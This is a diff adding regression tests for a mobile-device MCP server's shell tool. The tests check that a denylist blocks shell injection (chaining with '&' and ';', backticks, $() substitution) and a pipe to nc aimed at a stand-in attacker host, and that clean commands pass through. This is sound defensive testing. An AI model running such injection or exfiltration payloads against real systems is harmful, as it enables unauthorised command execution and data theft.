@@ -286,3 +286,112 @@ describe("system_is_running", () => {
     expect((result as { text: string }).text).toBe("false");
   });
 });
+
+// ──────────────────────────────────────────────
+// system_shell — host-side injection regression (issue #40)
+// ──────────────────────────────────────────────
+//
+// These tests guard the MCP-tool-layer denylist (`validateShellCommand`) AND verify
+// that benign commands cross the boundary to `deviceManager.shell` cleanly for every
+// supported platform. The structural defense (argv-form `execFileSync` in each client)
+// is covered separately in `src/adb/client.test.ts`, `src/ios/client.test.ts`, and
+// `src/aurora/client.test.ts` — those exercise the real host-side side-effect path.
+// Here we lock in that the tool handler cannot bypass the denylist on its way to the
+// client, no matter which platform is selected.
+
+describe("system_shell — injection denylist", () => {
+  const handler = findHandler("system_shell");
+
+  it("rejects `& touch /tmp/RCE` via validateShellCommand (android)", async () => {
+    const shell = vi.fn(() => "");
+    const ctx = makeMockContext({
+      deviceManager: { getCurrentPlatform: vi.fn(() => "android"), shell } as any,
+    });
+    await expect(handler({ command: "x & touch /tmp/RCE", platform: "android" }, ctx)).rejects.toThrow(MobileError);
+    expect(shell).not.toHaveBeenCalled();
+  });
+
+  it("rejects `& touch /tmp/RCE` via validateShellCommand (ios)", async () => {
+    const shell = vi.fn(() => "");
+    const ctx = makeMockContext({
+      deviceManager: { getCurrentPlatform: vi.fn(() => "ios"), shell } as any,
+    });
+    await expect(handler({ command: "x & touch /tmp/RCE", platform: "ios" }, ctx)).rejects.toThrow(MobileError);
+    expect(shell).not.toHaveBeenCalled();
+  });
+
+  it("rejects `& touch /tmp/RCE` via validateShellCommand (aurora)", async () => {
+    const shell = vi.fn(() => "");
+    const ctx = makeMockContext({
+      deviceManager: { getCurrentPlatform: vi.fn(() => "aurora"), shell } as any,
+    });
+    await expect(handler({ command: "x & touch /tmp/RCE", platform: "aurora" }, ctx)).rejects.toThrow(MobileError);
+    expect(shell).not.toHaveBeenCalled();
+  });
+
+  it("rejects `; touch` chaining", async () => {
+    const shell = vi.fn(() => "");
+    const ctx = makeMockContext({
+      deviceManager: { getCurrentPlatform: vi.fn(() => "android"), shell } as any,
+    });
+    await expect(handler({ command: "ls; touch /tmp/RCE" }, ctx)).rejects.toThrow(MobileError);
+    expect(shell).not.toHaveBeenCalled();
+  });
+
+  it("rejects backticks", async () => {
+    const shell = vi.fn(() => "");
+    const ctx = makeMockContext({
+      deviceManager: { getCurrentPlatform: vi.fn(() => "android"), shell } as any,
+    });
+    await expect(handler({ command: "echo `touch /tmp/RCE`" }, ctx)).rejects.toThrow(MobileError);
+    expect(shell).not.toHaveBeenCalled();
+  });
+
+  it("rejects $() command substitution", async () => {
+    const shell = vi.fn(() => "");
+    const ctx = makeMockContext({
+      deviceManager: { getCurrentPlatform: vi.fn(() => "android"), shell } as any,
+    });
+    await expect(handler({ command: "echo $(touch /tmp/RCE)" }, ctx)).rejects.toThrow(MobileError);
+    expect(shell).not.toHaveBeenCalled();
+  });
+
+  it("rejects pipe |", async () => {
+    const shell = vi.fn(() => "");
+    const ctx = makeMockContext({
+      deviceManager: { getCurrentPlatform: vi.fn(() => "android"), shell } as any,
+    });
+    await expect(handler({ command: "ls | nc evil.example 1337" }, ctx)).rejects.toThrow(MobileError);
+    expect(shell).not.toHaveBeenCalled();
+  });
+
+  it("passes a clean command through to deviceManager.shell (android)", async () => {
+    const shell = vi.fn(() => "ok");
+    const ctx = makeMockContext({
+      deviceManager: { getCurrentPlatform: vi.fn(() => "android"), shell } as any,
+    });
+    const result = await handler({ command: "pm list packages", platform: "android" }, ctx);
+    expect(shell).toHaveBeenCalledWith("pm list packages", "android", undefined);
+    expect((result as { text: string }).text).toContain("ok");
+  });
+
+  it("passes a clean command through to deviceManager.shell (ios)", async () => {
+    const shell = vi.fn(() => "ok");
+    const ctx = makeMockContext({
+      deviceManager: { getCurrentPlatform: vi.fn(() => "ios"), shell } as any,
+    });
+    const result = await handler({ command: "list devices", platform: "ios" }, ctx);
+    expect(shell).toHaveBeenCalledWith("list devices", "ios", undefined);
+    expect((result as { text: string }).text).toContain("ok");
+  });
+
+  it("passes a clean command through to deviceManager.shell (aurora)", async () => {
+    const shell = vi.fn(() => "ok");
+    const ctx = makeMockContext({
+      deviceManager: { getCurrentPlatform: vi.fn(() => "aurora"), shell } as any,
+    });
+    const result = await handler({ command: "uname -a", platform: "aurora" }, ctx);
+    expect(shell).toHaveBeenCalledWith("uname -a", "aurora", undefined);
+    expect((result as { text: string }).text).toContain("ok");
+  });
+});
